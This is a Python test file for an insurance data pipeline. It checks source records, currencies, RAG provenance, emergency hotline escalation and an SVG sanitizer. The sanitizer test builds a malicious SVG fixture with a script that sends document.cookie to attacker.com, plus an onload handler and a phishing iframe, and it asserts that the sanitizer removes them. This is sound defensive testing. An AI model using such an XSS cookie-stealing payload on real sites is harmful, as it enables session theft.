"""Comprehensive Quality Assurance and Verification Tests for INSURRA Data Pipeline.
Validates source registry, brand asset sanitizer, product constraints, currencies,
adversarial prompt injection fixtures, medical emergency safety, and downstream packages.
Never use em dashes in strings or docstrings.
"""

from alembic import command
from alembic.config import Config

from app.core.config import ROOT, get_settings
from app.pipeline.brand_assets.collector import PLACEHOLDER_SVG_DEFINITIONS
from app.pipeline.brand_assets.sanitizer import AssetSanitizer
from app.pipeline.discovery.registry import OFFICIAL_SOURCES
from app.pipeline.generators.cn_data import (
    CN_COMPANIES,
    CN_PRODUCTS,
    CN_REGULATIONS,
    CN_UNIVERSITY_REQUIREMENTS,
)
from app.pipeline.generators.id_data import ID_COMPANIES, ID_PRODUCTS, ID_REGULATIONS
from app.pipeline.generators.rules_data import DETERMINISTIC_RULES
from app.pipeline.rag.chunker import CN_RAG_CHUNKS, ID_RAG_CHUNKS
from app.pipeline.runner import PipelineRunner
from app.pipeline.schemas.models import AccessDecision, PipelineVerificationStatus
from app.pipeline.synthetic.generator import SYNTHETIC_FIXTURES


def test_source_registry_integrity():
    """All official sources must have valid country, URL, publisher, and access decisions."""
    assert len(OFFICIAL_SOURCES) >= 28

    source_ids = set()
    for s in OFFICIAL_SOURCES:
        assert s.source_id not in source_ids, f"Duplicate source ID: {s.source_id}"
        source_ids.add(s.source_id)

        assert s.country in ("CN", "ID"), f"Invalid country {s.country} in {s.source_id}"
        assert s.url.startswith("https://") or s.url.startswith("http://")
        assert s.publisher and len(s.publisher) > 2
        assert s.access_decision in AccessDecision
        assert s.verification_status in PipelineVerificationStatus

        # Ensure no em dashes in strings
        assert "\u2014" not in s.official_identity
        assert "\u2014" not in s.publisher
        assert "\u2014" not in s.terms_of_use_summary
        assert "\u2014" not in s.access_restrictions


def test_brand_asset_sanitizer_security():
    """SVG sanitizer must strip malicious script tags, iframes, and attributes."""
    malicious_svg = (
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert(\'xss\')">\n'
        "  <script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>\n"
        '  <circle cx="50" cy="50" r="40" onclick="evilAction()" />\n'
        '  <iframe src="http://phishing.site"></iframe>\n'
        '  <text x="10" y="20">Official Insurer</text>\n'
        "</svg>"
    )

    sanitizer = AssetSanitizer()
    sanitized_bytes, width, height = sanitizer.sanitize_svg(malicious_svg)
    sanitized = sanitized_bytes.decode("utf-8")

    assert "<script" not in sanitized.lower()
    assert "<iframe" not in sanitized.lower()
    assert "onload" not in sanitized.lower()
    assert "onclick" not in sanitized.lower()
    assert "alert(" not in sanitized
    assert "attacker.com" not in sanitized
    assert "Official Insurer" in sanitized


def test_placeholder_brand_svg_definitions():
    """All placeholder logo SVGs must have viewBox, width, height, and valid XML."""
    sanitizer = AssetSanitizer()
    for insurer_id, definition in PLACEHOLDER_SVG_DEFINITIONS.items():
        svg = definition["svg"]
        assert "viewBox" in svg, f"Missing viewBox in {insurer_id}"
        assert definition["primary_color"].startswith("#")

        # Sanitize and check valid output
        clean_bytes, w, h = sanitizer.sanitize_svg(svg)
        clean = clean_bytes.decode("utf-8")
        assert clean.startswith("<svg")
        assert clean.strip().endswith("</svg>")


def test_products_currency_and_country_consistency():
    """China products must use CNY and Indonesia products must use IDR."""
    for p in CN_PRODUCTS:
        assert p.coverage_country == "CN"
        assert p.currency == "CNY", f"Invalid currency {p.currency} for CN product {p.product_id}"
        assert p.product_version
        assert p.product_status == "ACTIVE"
        for ben in p.benefits:
            assert ben.currency == "CNY"

    for p in ID_PRODUCTS:
        assert p.coverage_country == "ID"
        assert p.currency == "IDR", f"Invalid currency {p.currency} for ID product {p.product_id}"
        assert p.product_version
        assert p.product_status == "ACTIVE"
        for ben in p.benefits:
            assert ben.currency == "IDR"


def test_legal_entity_brand_integrity():
    """All products must reference a valid licensed insurer entity in the company registry."""
    valid_insurer_ids = {c.insurer_id for c in CN_COMPANIES + ID_COMPANIES}

    for p in CN_PRODUCTS + ID_PRODUCTS:
        assert p.insurer_id in valid_insurer_ids, (
            f"Product {p.product_id} references unknown insurer {p.insurer_id}"
        )


def test_original_language_evidence_preservation():
    """Regulations, benefits, and schemes must preserve original Chinese and Indonesian terms."""
    for reg in CN_REGULATIONS:
        assert any("\u4e00" <= c <= "\u9fff" for c in reg.title_original), (
            f"Missing Chinese characters in {reg.regulation_id}"
        )

    for reg in ID_REGULATIONS:
        assert "Undang-Undang" in reg.title_original or "Peraturan" in reg.title_original, (
            f"Missing Indonesian official prefix in {reg.regulation_id}"
        )

    for u in CN_UNIVERSITY_REQUIREMENTS:
        assert any("\u4e00" <= c <= "\u9fff" for c in u.institution_name_original)


def test_adversarial_prompt_injection_fixtures():
    """Adversarial prompt injection fixtures must be flagged and handled safely."""
    injection_fixtures = [f for f in SYNTHETIC_FIXTURES if f.category == "prompt_injection_test"]
    assert len(injection_fixtures) >= 2

    for fix in injection_fixtures:
        assert fix.is_adversarial is True
        assert "INJECTION_DETECTED" in fix.expected_outcome
        assert "malicious_text" in fix.payload


def test_medical_emergency_safety_escalation():
    """Medical safety test fixtures must escalate life-threatening symptoms to national hotlines."""
    med_fixtures = [f for f in SYNTHETIC_FIXTURES if f.category == "medical_safety_test"]
    assert len(med_fixtures) >= 2

    for fix in med_fixtures:
        assert fix.is_adversarial is False
        if fix.country_code == "CN":
            assert "120" in fix.expected_outcome
        elif fix.country_code == "ID":
            assert "119" in fix.expected_outcome or "118" in fix.expected_outcome


def test_deterministic_rules_structure():
    """Deterministic rules must define explicit conditions, operators, and required evidence."""
    assert len(DETERMINISTIC_RULES) >= 4
    for r in DETERMINISTIC_RULES:
        assert r.rule_id
        assert r.country_code in ("CN", "ID")
        assert len(r.applicable_personas) > 0
        assert len(r.required_evidence) > 0
        assert r.threshold_or_condition
        assert r.verification_status == PipelineVerificationStatus.UNVERIFIED


def test_rag_chunks_provenance():
    """All RAG chunks must have traceable source URL, original text, and verification status."""
    for chunk in CN_RAG_CHUNKS:
        assert chunk.country == "CN"
        assert chunk.source_url.startswith("https://") or chunk.source_url.startswith("http://")
        assert chunk.original_source_text
        assert chunk.verification_status in PipelineVerificationStatus

    for chunk in ID_RAG_CHUNKS:
        assert chunk.country == "ID"
        assert chunk.source_url.startswith("https://") or chunk.source_url.startswith("http://")
        assert chunk.original_source_text
        assert chunk.verification_status in PipelineVerificationStatus


def test_pipeline_runner_execution_and_exports(tmp_path, monkeypatch):
    """PipelineRunner must execute successfully in dry-run mode and produce all team packages."""
    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{tmp_path / 'pipeline.db'}")
    get_settings.cache_clear()
    command.upgrade(Config(str(ROOT / "backend/alembic.ini")), "head")
    runner = PipelineRunner(root=ROOT)
    result = runner.run(live_network=False)
    get_settings.cache_clear()

    assert result["status"] == "COMPLETED"
    assert result["total_sources"] >= 28
    assert result["cn_sources"] >= 15
    assert result["id_sources"] >= 13
    assert result["brand_assets_sanitized"] >= 12
    assert result["cn_products"] >= 3
    assert result["id_products"] >= 4

    # Verify downstream packages exist and are non-empty
    exports_dir = ROOT / "kb/exports"
    regina_pkg = exports_dir / "regina_data_package.json"
    valen_pkg = exports_dir / "valen_data_package.json"
    joshua_pkg = exports_dir / "joshua_data_package.json"

    assert regina_pkg.is_file() and regina_pkg.stat().st_size > 1000
    assert valen_pkg.is_file() and valen_pkg.stat().st_size > 1000
    assert joshua_pkg.is_file() and joshua_pkg.stat().st_size > 1000

    # Verify quality report exists
    report_file = ROOT / "docs/prd/DATA_PROVENANCE_AND_QUALITY_REPORT.md"
    assert report_file.is_file() and report_file.stat().st_size > 500
